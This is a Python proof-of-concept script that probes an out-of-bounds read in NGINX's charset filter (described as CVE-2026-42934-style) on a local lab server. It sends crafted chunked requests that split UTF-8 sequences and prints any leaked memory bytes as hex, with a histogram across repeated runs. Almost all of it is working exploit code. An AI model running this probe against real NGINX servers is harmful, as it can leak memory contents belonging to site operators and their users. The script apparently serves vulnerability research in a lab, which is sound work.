#!/usr/bin/env python3
"""Exercise the NGINX charset filter OOB-read path through a streaming backend."""

from __future__ import annotations

import argparse
import socket
import string
from dataclasses import dataclass
from urllib.parse import urlencode


PRINTABLE = set(bytes(string.printable, "ascii"))


@dataclass(frozen=True)
class ProbeResult:
    status: str
    headers: bytes
    body: bytes


def split_target(value: str) -> tuple[str, int]:
    if ":" not in value:
        return value, 19321
    host, port = value.rsplit(":", 1)
    return host, int(port)


def http_get(host: str, port: int, path: str, timeout: float) -> ProbeResult:
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: charset-oob-probe/0.1\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)
        response = bytearray()

        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            response.extend(chunk)

    header, _, body = bytes(response).partition(b"\r\n\r\n")
    lines = header.splitlines()
    status = lines[0].decode("latin-1", errors="replace") if lines else "NO STATUS"
    if b"transfer-encoding: chunked" in header.lower():
        body = dechunk(body)
    return ProbeResult(status=status, headers=header, body=body)


def dechunk(body: bytes) -> bytes:
    out = bytearray()
    pos = 0

    while pos < len(body):
        line_end = body.find(b"\r\n", pos)
        if line_end == -1:
            break
        size_line = body[pos:line_end].split(b";", 1)[0]
        try:
            size = int(size_line, 16)
        except ValueError:
            return body
        pos = line_end + 2
        if size == 0:
            break
        out.extend(body[pos:pos + size])
        pos += size + 2

    return bytes(out)


def body_preview(body: bytes) -> str:
    chars = []
    for value in body:
        if value in PRINTABLE and value not in (0x0b, 0x0c):
            chars.append(chr(value))
        else:
            chars.append(".")
    return "".join(chars)


def request_path(
    mode: str,
    tail: str,
    delay: float,
    prefix: int,
    chunks: str | None,
    framing: str,
) -> str:
    query = {
        "mode": mode,
        "tail": tail,
        "delay": f"{delay:.4f}",
        "prefix": str(prefix),
        "framing": framing,
    }
    if chunks:
        query["chunks"] = chunks
    return "/charset/?" + urlencode(query)


def classify(body: bytes, tail: bytes) -> tuple[str, bytes]:
    if len(body) <= 2:
        return "no visible over-read", b""

    if body.startswith(b"\x88") and body.endswith(tail):
        return "visible byte before next upstream buffer", body[1:-len(tail)]

    return "unexpected body shape", body


def run(args: argparse.Namespace) -> int:
    host, port = split_target(args.target)
    tail = bytes.fromhex(args.tail)

    print(f"target        {host}:{port}")
    print(f"probe path    /charset/ via source_charset=utf-8 -> charset=windows-1251")
    print(f"mode          {args.mode}")
    print(f"framing       {args.framing}")
    print(f"runs          {args.runs}")
    print()

    seen: dict[bytes, int] = {}

    for run_id in range(1, args.runs + 1):
        path = request_path(args.mode, args.tail, args.delay, args.prefix, args.chunks, args.framing)
        result = http_get(host, port, path, timeout=args.timeout)
        label, leak = classify(result.body, tail)
        seen[leak] = seen.get(leak, 0) + 1

        print(f"[{run_id:03d}] {result.status}")
        print(f"      body len   {len(result.body)}")
        print(f"      body hex   {result.body.hex(' ')}")
        print(f"      body text  {body_preview(result.body)}")
        print(f"      verdict    {label}")
        if leak:
            print(f"      leak hex   {leak.hex(' ')}")
        print()

    if seen:
        print("leak histogram")
        for leak, count in sorted(seen.items(), key=lambda item: (-item[1], item[0])):
            label = leak.hex(" ") if leak else "<none>"
            print(f"  {count:4d}  {label}")

    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Probe CVE-2026-42934-style charset OOB reads in the local NGINX Rift lab."
    )
    parser.add_argument("target", help="host or host:port for the NGINX lab, default port 19321")
    parser.add_argument("--runs", type=int, default=20, help="number of repeated requests")
    parser.add_argument("--mode", default="euro3", choices=("plain", "euro3", "euro4", "custom"))
    parser.add_argument("--tail", default="58", help="hex bytes sent in the chunk after the split UTF-8 sequence")
    parser.add_argument("--chunks", help="custom comma-separated hex chunks, used with --mode custom")
    parser.add_argument("--framing", default="chunked", choices=("chunked", "close", "length"))
    parser.add_argument("--delay", type=float, default=0.03, help="delay between upstream chunks")
    parser.add_argument("--prefix", type=int, default=0, help="ASCII prefix bytes before the split UTF-8 sequence")
    parser.add_argument("--timeout", type=float, default=5.0, help="socket timeout in seconds")
    return parser


if __name__ == "__main__":
    raise SystemExit(run(build_parser().parse_args()))
